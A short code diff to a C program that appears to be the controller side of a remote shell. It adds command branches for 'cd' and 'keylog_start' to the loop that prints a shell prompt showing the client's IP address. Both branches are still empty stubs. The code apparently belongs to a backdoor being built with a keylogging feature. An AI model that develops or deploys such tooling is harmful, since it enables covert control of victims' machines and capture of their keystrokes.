@@ -40,6 +40,7 @@ int main()
 
     while (true)
     {
+        jump:
         memset(&buffer, 0, sizeof(buffer));
         memset(&response, 0, sizeof(response));
         printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr)); // prints client ip address
@@ -49,6 +50,14 @@ int main()
         if (strncmp("q", buffer, 1) == 0)
         {
             break; // exits loop
+        }
+        else if (strncmp("cd ", buffer, 3) == 0)
+        {
+            goto jump;
+        }
+        else if (strncmp("keylog_start", buffer, 12) ==0 )
+        {
+            goto jump;
         }
         else
         {
